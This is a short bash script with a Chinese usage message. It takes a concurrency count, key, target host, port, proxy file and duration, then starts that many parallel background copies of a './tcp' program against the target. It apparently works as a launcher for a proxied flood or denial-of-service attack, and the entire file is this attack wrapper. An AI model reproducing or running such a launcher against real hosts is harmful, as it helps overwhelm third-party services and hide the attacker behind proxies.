#!/bin/bash
if [ "$#" -ne 6 ]; then
    echo "用法: $0 <并发数> <key> <目标> <端口> <代理> <时间>"
    exit 1
fi

concurrency="$1"
key="$2"
target="$3"
port="$4"
proxy_file="$5"
time="$6"

for ((i = 1; i <= $concurrency; i++)); do
    ./tcp $key http://$target:$port $proxy_file $time &
done
